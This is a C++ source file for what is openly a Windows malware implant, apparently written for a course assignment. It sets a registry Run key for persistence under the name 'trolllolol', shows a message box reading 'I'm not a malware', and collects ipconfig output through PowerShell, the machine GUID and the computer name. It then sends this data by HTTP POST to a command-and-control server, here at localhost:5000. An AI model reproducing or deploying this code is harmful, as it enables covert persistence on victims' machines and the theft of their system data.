#include <cstdlib>
#include <fstream>
#include <iostream>
#include "httpClient.h"

#define INFO_BUFFER_SIZE 32767

LONG getGUID(char* res, DWORD* size);
LONG persistenceLOL(void);
/* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
int wmain()
{
    persistenceLOL();
    //WELCOME TO THE WORLD
    int msgboxID = MessageBoxA(
        NULL,
        (LPCSTR)"I'm not a malware:D",
        (LPCSTR)"Not a malware",
        MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
    );

    // implant first checks the Computer Name and IP address. Then sends it to the c2
    std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
    std::ifstream temp_file("C:\\Users\\User\\test.txt");
    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
    std::remove("C:\\Users\\User\\test.txt");

    //get machine guid
    char value[255];
    DWORD BufferSize = sizeof(value);
    if(getGUID(value, &BufferSize)){
        printf("Can't get machine guid\n");
    }
    printf("%s :D\n", value);

    //get computer name
    char infoBuf[INFO_BUFFER_SIZE];
    DWORD bufCharCount = INFO_BUFFER_SIZE;
    GetComputerNameA((LPSTR)infoBuf, &bufCharCount);
    first_impression.append(infoBuf);
    printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());

    // if successful, connect to the server
    HTTP *client = new HTTP();
    int port = 5000, tls = 0;
    client->connectToServer(L"localhost", port);
    if(!client->checkConnection()){
        wprintf(L"Error, couldn't connect to server\n");
        return 1;
    }

    client->additionalHeader = L"ch0nk: lol";
    client->header_size = 10;
    std::wcout << client->makeHttpRequest(L"GET", L"/", tls) << std::endl;
    char jsonTest[] = "{\"Objectname\", \"hello :D\"";
    client->requestData = (char*)first_impression.c_str();
    client->data_size = first_impression.size();
    printf("size of data_size: %d\n", client->data_size);
    std::wcout << client->makeHttpRequest(L"POST", L"/", tls) << std::endl;

    delete client;
    return 0;
}

// https://stackoverflow.com/questions/48432994/c-read-machine-guid-via-reggetvalue
LONG getGUID(char* res, DWORD* size){
    HKEY mykey;
    auto result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &mykey);
    //LONG result = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, res, size);
    if (result == 0){
        RegQueryValueExA(mykey, "MachineGuid", NULL, NULL, (LPBYTE)res, size);
        RegCloseKey(mykey);
    }
    else{
        std::cerr << "Error: " << res << std::endl;
        return 1;
    }
    return 0;
}

LONG persistenceLOL(){
    HKEY mykey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &mykey);
    const char* czStartName = "trolllolol";
    const char* czExePath   = "\"C:\\Users\\user\\Desktop\\vs_programs\\Assignment-4\\a.exe\"";
    res = RegSetValueExA(mykey, (LPCSTR)czStartName, 0, REG_SZ, (unsigned char*)czExePath, strlen(czExePath) + 1);
    RegCloseKey(mykey);
    return res;
}
